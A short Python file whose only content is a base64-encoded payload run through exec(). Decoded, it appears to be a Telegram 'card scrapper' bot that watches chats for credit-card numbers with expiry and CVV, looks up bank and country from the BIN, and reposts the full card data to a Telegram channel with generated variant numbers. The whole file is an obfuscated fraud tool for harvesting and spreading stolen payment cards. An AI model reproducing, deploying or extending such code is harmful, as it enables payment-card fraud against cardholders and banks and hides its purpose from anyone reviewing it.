import base64
exec(base64.b64decode('ZnJvbSB0ZWxldGhvbiBpbXBvcnQgVGVsZWdyYW1DbGllbnQsIGV2ZW50cwppbXBvcnQgdGVsZWJvdAppbXBvcnQgcmUKaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBhc3luY2lvCmltcG9ydCByYW5kb20KZnJvbSBvcyBpbXBvcnQgc3lzdGVtLCBuYW1lCmZyb20gYmluIGltcG9ydCBnZXRfYmluX2luZm8KZnJvbSBhcGlzIGltcG9ydCBhcGlkLCBhcGloYXNkLCB0b2tlbgoKbm93ID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkKbWVzX2FjdHVhbCA9IG5vdy5tb250aAphbm9fYWN0dWFsID0gbm93LnllYXIKCmNsaWVudCA9IFRlbGVncmFtQ2xpZW50KCdzY3JhcGZyZWUnLCBhcGlkLCBhcGloYXNkKQpjbGllbnQucGFyc2VfbW9kZSA9ICdodG1sJwoKYm90ID0gdGVsZWJvdC5UZWxlQm90KHRva2VuLCBwYXJzZV9tb2RlPSJodG1sIikKCmlkX2NoYW5uZWwgPSAtMTAwMjQ1MDI0NzkxMwppZF9hbGVydF9jaGFubmVsID0gLTEwMDI0MzIxNzkwMDcKCmNhcmRzX3Byb2Nlc3MgPSB7fQoKYXN5bmMgZGVmIGhhbmRsZV9sb2dpbl9pc3N1ZSgpOgogICAgdHJ5OgogICAgICAgIGF3YWl0IGJvdC5zZW5kX21lc3NhZ2UoCiAgICAgICAgICAgIGlkX2FsZXJ0X2NoYW5uZWwsCiAgICAgICAgICAgICLimqDvuI8gRWwgYm90IG5lY2VzaXRhIGluaWNpYXIgc2VzacOzbiBudWV2YW1lbnRlLiIKICAgICAgICApCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBhbGVydGEgbG9naW46IHtlfSIpCgpAY2xpZW50Lm9uKGV2ZW50cy5OZXdNZXNzYWdlKQphc3luYyBkZWYgZWRpdGVkX2V2ZW50KGV2ZW50OiBldmVudHMpOgogICAgdHJ5OgogICAgICAgIHRleHRfbXNnID0gZXZlbnQucmF3X3RleHQKICAgIGV4Y2VwdCBNZW1vcnlFcnJvcjoKICAgICAgICByZXR1cm4KCiAgICBjYXJkX3BhdHRlcm4gPSByZS5jb21waWxlKHInXGIoXGR7MTZ9KVx8KFxkezJ9KVx8KFxkezR9KVx8KFxkezN9KVxiJykKICAgIG1hdGNoID0gY2FyZF9wYXR0ZXJuLmZpbmRhbGwodGV4dF9tc2cpCgogICAgaWYgbm90IG1hdGNoOgogICAgICAgIHJldHVybgoKICAgIGNjLCBtZXMsIGFubywgY3Z2ID0gbWF0Y2hbMF0KCiAgICBpZiBjYXJkc19wcm9jZXNzLmdldChjYywgMCkgPj0gMzoKICAgICAgICByZXR1cm4KCiAgICByYW5kb21fZGlnaXRzID0gIiIuam9pbihyYW5kb20uY2hvaWNlKCIwMTIzNDU2Nzg5IikgZm9yIF8gaW4gcmFuZ2UoNikpCgogICAgeCA9IGdldF9iaW5faW5mbyhjY1s6Nl0pCgogICAgdGV4dCA9IGYiIiIKICAgICAgICA8Yj48YSBocmVmPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVlNYWC1TQ1JQL0NvZGUvbWFpbi9zY3JwLmpwZyI+JiM4MjAzOzwvYT4KICAgICAgICBbPGEgaHJlZj0iaHR0cHM6Ly90Lm1lLytDcU5BcmVVS0NfdGlZekZoIj7kuYg8L2E+XSDwnZCV8J2QkvCdkJfwnZCXIPCdkJLwnZCC8J2QkfCdkIDwnZCP8J2Qj/CdkITwnZCRIC0g44CQIPCdkIXwnZCR8J2QhPCdkIQg44CRCiAgICAgICAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBCiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gI2JpbntjY1s6Nl19CiAgICAgICAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBCiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gQ0Mg4p6rIDxjb2RlPntjY318e21lc318e2Fub318e2N2dn08L2NvZGU+CiAgICAgICAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBCiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gQ291bnRyeSDinqsgPGNvZGU+e3guZ2V0KCJjb3VudHJ5Iil9PC9jb2RlPiB8IDxjb2RlPnt4LmdldCgiZmxhZyIpfTwvY29kZT4KICAgICAgICBbPGEgaHJlZj0iaHR0cHM6Ly90Lm1lLytDcU5BcmVVS0NfdGlZekZoIj7kuYg8L2E+XSBUeXBlIOKeqyA8Y29kZT57eC5nZXQoInR5cGUiKX08L2NvZGU+IHwgPGNvZGU+e3guZ2V0KCJ2ZW5kb3IiKX08L2NvZGU+CiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gTGV2ZWwg4p6rIDxjb2RlPnt4LmdldCgibGV2ZWwiKX08L2NvZGU+CiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gQmFuayDinqsgPGNvZGU+e3guZ2V0KCJiYW5rX25hbWUiKX08L2NvZGU+CiAgICAgICAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBCiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gRXh0cmEg4p6rIDxjb2RlPntjY1s6OF19e3JhbmRvbV9kaWdpdHN9eHh4eHx7bWVzfXx7YW5vfXxybmQ8L2NvZGU+CiAgICAgICAgWzxhIGhyZWY9Imh0dHBzOi8vdC5tZS8rQ3FOQXJlVUtDX3RpWXpGaCI+5LmIPC9hPl0gUG93ZXJlZCBieSDinqsgPGEgaHJlZj0iaHR0cHM6Ly90Lm1lL0NMMFVEX0FETUlOIj5AQ0wwVURfQURNSU4g8J+lgDwvYT4KICAgICAgICA8L2I+CiAgICAgICAgIiIiCgogICAgYXdhaXQgYXN5bmNpby5zbGVlcCgzMS41KQoKICAgIHRyeToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGlkX2NoYW5uZWwsIHRleHQsIHBhcnNlX21vZGU9IkhUTUwiKQogICAgZXhjZXB0OgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoaWRfY2hhbm5lbCwgdGV4dCwgZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3PVRydWUpCgogICAgY2FyZHNfcHJvY2Vzc1tjY10gPSBjYXJkc19wcm9jZXNzLmdldChjYywgMCkgKyAxCgoKYXN5bmMgZGVmIG1haW4oKToKICAgIHN5c3RlbSgnY2xzJyBpZiBuYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQogICAgcHJpbnQoJ0BDTDBVRF9BRE1JTicpCgogICAgdHJ5OgogICAgICAgIGF3YWl0IGNsaWVudC5zdGFydCgpCiAgICAgICAgYXdhaXQgY2xpZW50LnJ1bl91bnRpbF9kaXNjb25uZWN0ZWQoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYi4p2MIEVycm9yIGluaWNpbzoge2V9IikKICAgICAgICBhd2FpdCBoYW5kbGVfbG9naW5faXNzdWUoKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBhc3luY2lvLnJ1bihtYWluKCkpCg==').decode('utf-8'))
